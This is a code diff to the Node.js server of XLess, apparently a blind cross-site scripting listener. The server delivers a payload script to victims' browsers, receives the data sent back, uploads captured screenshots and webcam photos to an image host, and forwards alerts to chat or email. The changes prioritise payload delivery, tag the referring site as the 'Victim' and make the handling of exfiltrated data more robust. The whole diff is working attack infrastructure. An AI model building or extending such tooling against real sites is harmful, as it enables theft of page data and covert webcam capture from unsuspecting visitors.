@@ -36,11 +36,7 @@ app.use(bodyParser.json({ limit: "15mb" }));
 app.use(bodyParser.urlencoded({ limit: "15mb", extended: true }));
 
 app.use(function (req, res, next) {
-  // Headers
   res.header("Powered-By", "XLESS");
-  res.header("Access-Control-Allow-Origin", "*");
-  res.header("Access-Control-Allow-Methods", "GET,POST");
-  res.header("Access-Control-Allow-Headers", "Content-Type");
   next();
 });
 
@@ -108,8 +104,17 @@ function generate_callback_alert(headers, data, url) {
   alert += "═══════════════════════════════════\n\n";
   alert += `🌐 **Remote IP:** \`${data["Remote IP"]}\`\n`;
   alert += `📍 **Request URI:** \`${url}\`\n`;
+
+  // Add Source Domain (Victim)
+  var referer = headers["referer"] || headers["origin"];
+  if (referer) {
+    alert += `🔗 **Source (Victim):** \`${referer}\`\n`;
+  } else {
+    alert += `🔗 **Source (Victim):** \`Unknown (Direct Access?)\`\n`;
+  }
+
   alert += `💻 **User-Agent:** \`${headers["user-agent"] || "Unknown"}\`\n`;
-  alert += `🏠 **Host:** \`${headers["host"] || "Unknown"}\`\n\n`;
+  alert += `🏠 **Listener Host:** \`${headers["host"] || "Unknown"}\`\n\n`;
 
   alert += "📋 **All Headers:**\n\`\`\`\n";
   for (var key in headers) {
@@ -122,8 +127,16 @@ function generate_callback_alert(headers, data, url) {
   return alert;
 }
 
-function generate_message_alert(body) {
+function generate_message_alert(body, req) {
   var alert = "*XSSless: Message Alert*\n";
+
+  if (req) {
+    var referer = req.headers["referer"] || req.headers["origin"];
+    if (referer) {
+      alert += `🔗 **Source:** \`${referer}\`\n\n`;
+    }
+  }
+
   alert += "```\n" + body + "```\n";
   return alert;
 }
@@ -472,8 +485,15 @@ app.get("/examples", (req, res) => {
 
 app.all("/message", async (req, res) => {
   var message = req.query.text || req.body.text;
-  const alert = generate_message_alert(message);
-  var domain = req.headers["host"] || "Unknown";
+  const alert = generate_message_alert(message, req);
+
+  // Extract domain from Referer/Origin first, fallback to Host if needed (but Host is usually the listener)
+  var domain = "Unknown";
+  var updated_referer = req.headers["referer"] || req.headers["origin"];
+
+  if (updated_referer) {
+    try { domain = new URL(updated_referer).hostname; } catch (e) { domain = updated_referer; }
+  }
 
   // Send Notifications
   await sendNotifications(alert, null, "XLess Message Alert — " + domain);
@@ -483,64 +503,83 @@ app.all("/message", async (req, res) => {
 });
 
 app.post("/c", async (req, res) => {
-  let data = req.body;
-
-  // Upload our screenshot and only then send the Slack/Discord alert
-  data["Screenshot URL"] = "";
-
-  if (imgbb_api_key && data["Screenshot"]) {
-    const encoded_screenshot = data["Screenshot"].replace(
-      "data:image/png;base64,",
-      ""
-    );
-
-    try {
-      const imgRes = await uploadImage(encoded_screenshot);
-      const imgOut = JSON.parse(imgRes);
-      if (imgOut.error) {
-        data["Screenshot URL"] = "NA";
-        console.error("ImgBB error:", imgOut.error);
-      } else if (imgOut.data && imgOut.data.url) {
-        // Use direct image URL (not url_viewer) so it embeds in Discord/Slack
-        data["Screenshot URL"] = imgOut.data.url;
-        console.log("Screenshot uploaded:", imgOut.data.url);
-      }
-    } catch (e) {
-      data["Screenshot URL"] = e.message;
-    }
-  }
-
-  // Upload webcam photo if captured
-  data["Webcam URL"] = "";
-  if (imgbb_api_key && data["Webcam"] && data["Webcam"].startsWith("data:image")) {
-    const encoded_webcam = data["Webcam"].replace(/^data:image\/\w+;base64,/, "");
-    try {
-      const webcamRes = await uploadImage(encoded_webcam);
-      const webcamOut = JSON.parse(webcamRes);
-      if (webcamOut.data && webcamOut.data.url) {
-        data["Webcam URL"] = webcamOut.data.url;
-        console.log("Webcam photo uploaded:", webcamOut.data.url);
-      }
-    } catch (e) {
-      console.error("Webcam upload error:", e.message);
-    }
-  }
-
-  // Now handle the regular alerts
-  data["Remote IP"] =
-    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
-  const alert = generate_blind_xss_alert(data);
-
-  // Extract domain for email subject
-  var domain = data["Document Domain"] || data["Document Location"] || data["Location"] || "Unknown";
-  // If it's a full URL, extract just the hostname
-  try { domain = new URL(domain).hostname || domain; } catch (e) { /* keep as-is */ }
-
-  // Send Notifications (pass both screenshot and webcam URLs)
-  await sendNotifications(alert, data["Screenshot URL"], "XLess Blind XSS Alert — " + domain, data["Webcam URL"]);
-
+  // Always respond OK first to avoid blocking the payload
   res.send("ok\n");
-  res.end();
+
+  try {
+    let data = req.body;
+    if (!data || typeof data !== 'object') {
+      console.error("Invalid payload received at /c");
+      return;
+    }
+
+    // Upload our screenshot and only then send the Slack/Discord alert
+    data["Screenshot URL"] = "";
+
+    if (imgbb_api_key && data["Screenshot"]) {
+      const encoded_screenshot = data["Screenshot"].replace(
+        "data:image/png;base64,",
+        ""
+      );
+
+      try {
+        const imgRes = await uploadImage(encoded_screenshot);
+        const imgOut = JSON.parse(imgRes);
+        if (imgOut.error) {
+          data["Screenshot URL"] = "NA";
+          console.error("ImgBB error:", imgOut.error);
+        } else if (imgOut.data && imgOut.data.url) {
+          data["Screenshot URL"] = imgOut.data.url;
+          console.log("Screenshot uploaded:", imgOut.data.url);
+        }
+      } catch (e) {
+        data["Screenshot URL"] = "upload failed";
+        console.error("Screenshot upload error:", e.message);
+      }
+    }
+
+    // Upload webcam photo if captured
+    data["Webcam URL"] = "";
+    if (imgbb_api_key && data["Webcam"] && typeof data["Webcam"] === 'string' && data["Webcam"].startsWith("data:image")) {
+      const encoded_webcam = data["Webcam"].replace(/^data:image\/\w+;base64,/, "");
+      try {
+        const webcamRes = await uploadImage(encoded_webcam);
+        const webcamOut = JSON.parse(webcamRes);
+        if (webcamOut.data && webcamOut.data.url) {
+          data["Webcam URL"] = webcamOut.data.url;
+          console.log("Webcam photo uploaded:", webcamOut.data.url);
+        }
+      } catch (e) {
+        console.error("Webcam upload error:", e.message);
+      }
+    }
+
+    // Now handle the regular alerts
+    data["Remote IP"] =
+      req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+    const alert = generate_blind_xss_alert(data);
+
+    // Extract domain for email subject (prioritize payload data, then referer)
+    var domain = data["Document Domain"] || data["Document Location"] || data["Location"];
+
+    if (!domain) {
+      var ref = req.headers["referer"] || req.headers["origin"];
+      if (ref) {
+        try { domain = new URL(ref).hostname; } catch (e) { domain = ref; }
+      }
+    }
+
+    // If we still don't have a domain, use "Unknown"
+    domain = domain || "Unknown";
+
+    // If it's a full URL, extract just the hostname
+    try { domain = new URL(domain).hostname || domain; } catch (e) { /* keep as-is */ }
+
+    // Send Notifications (pass both screenshot and webcam URLs)
+    await sendNotifications(alert, data["Screenshot URL"], "XLess Blind XSS Alert — " + domain, data["Webcam URL"]);
+  } catch (e) {
+    console.error("Critical error processing /c payload:", e);
+  }
 });
 
 /**
@@ -580,30 +619,40 @@ app.get("/health", async (req, res) => {
 });
 
 app.all("/*", async (req, res) => {
-  var headers = req.headers;
-  var data = req.body;
-  data["Remote IP"] =
-    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
-  const alert = generate_callback_alert(headers, data, req.url);
-  var domain = req.headers["host"] || "Unknown";
-
-  // Send Notifications
-  await sendNotifications(alert, null, "XLess Callback Alert — " + domain);
-
-  // Serve payload.js (cross-platform: Netlify, Vercel, Local)
-  // First check if payload was pre-loaded by serverless wrapper (Netlify)
+  // Serve payload first, then process notifications asynchronously
+  // This ensures the XSS payload is always delivered
   const cachedPayload = app.get('payloadContent');
   if (cachedPayload && cachedPayload !== '// payload not found') {
-    return res.type("application/javascript").send(cachedPayload);
+    res.type("application/javascript").send(cachedPayload);
+  } else {
+    try {
+      const payloadContent = fs.readFileSync(path.join(__dirname, "payload.js"), "utf8");
+      res.type("application/javascript").send(payloadContent);
+    } catch (err) {
+      console.error("Error serving payload.js:", err.message);
+      res.status(500).type("application/javascript").send("// Error: payload not found");
+    }
   }
 
-  // Fallback: read from filesystem (Local / Vercel)
+  // Process OOB callback notification (async, after response sent)
   try {
-    const payloadContent = fs.readFileSync(path.join(__dirname, "payload.js"), "utf8");
-    res.type("application/javascript").send(payloadContent);
-  } catch (err) {
-    console.error("Error serving payload.js:", err.message);
-    res.status(500).type("application/javascript").send("// Error: payload not found");
+    var headers = req.headers;
+    var data = req.body || {};
+    data["Remote IP"] =
+      req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+    const alert = generate_callback_alert(headers, data, req.url);
+
+    // Extract domain from Referer/Origin (Host is the listener, not the victim)
+    var domain = "Unknown";
+    var referer = req.headers["referer"] || req.headers["origin"];
+
+    if (referer) {
+      try { domain = new URL(referer).hostname; } catch (e) { domain = referer; }
+    }
+
+    await sendNotifications(alert, null, "XLess Callback Alert — " + domain);
+  } catch (e) {
+    console.error("Error processing callback alert:", e.message);
   }
 });
 
